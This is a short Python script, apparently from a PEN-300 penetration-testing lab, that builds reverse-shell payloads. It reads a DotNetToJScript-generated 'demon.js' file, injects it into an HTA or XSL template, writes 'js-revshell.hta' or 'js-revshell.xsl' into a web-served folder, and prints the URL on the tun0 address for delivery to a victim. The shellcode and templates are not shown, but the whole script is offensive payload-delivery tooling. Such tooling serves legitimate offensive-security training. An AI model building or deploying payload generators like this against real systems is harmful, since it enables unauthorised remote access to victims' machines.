#!/usr/bin/python3

import os
from temps.js_templates import templates_dict
import netifaces


def main(args):
    base_path = "/home/tijmen/pen300/www/pl"

    shellcode = generate_shellcode(args.template, args.arch)
    generate_payload(args, shellcode, base_path)


def generate_shellcode(template, arch):
    with open("/home/tijmen/pen300/smbshare/DotNetToJscript/demon.js", "r") as file_obj:
        buf = file_obj.read()

    return buf


def generate_payload(args, shellcode, base_path):
    try:
        if args.template in ["hta", "hta-ph"]:
            template = templates_dict["hta"]
        elif args.template in ["xsl", "xsl-ph"]:
            template = templates_dict["xsl"]   
    except Exception as e:
        raise ValueError("Unsupported template")
    try:
        final_output = template.replace("SHELLCODE", shellcode)
        if args.template in ["hta", "hta-ph"]:
            output_path = f"{base_path}/js-revshell.hta"
        elif args.template in ["xsl", "xsl-ph"]:
            output_path = f"{base_path}/js-revshell.xsl"

        if os.path.exists(output_path):
            os.remove(output_path)
        with open(output_path, "w+") as file_obj:
            file_obj.write(final_output)
        print(f"See '{output_path}' for the payload\n")

        addresses = netifaces.ifaddresses('tun0')
        ip_address = addresses[netifaces.AF_INET][0]['addr']

        if args.template in ["hta", "hta-ph"]:
            print("Saved at: /home/tijmen/pen300/www/pl/js-revshell.hta")
            print(f"Served at: http://{ip_address}/pl/js-revshell.hta")
        elif args.template in ["xsl", "xsl-ph"]:
            print("Saved at: /home/tijmen/pen300/www/pl/js-revshell.xsl")
            print(f"Served at: http://{ip_address}/pl/js-revshell.xsl")

    except Exception as e:
        raise ValueError(f"Error creating the template: {e}")
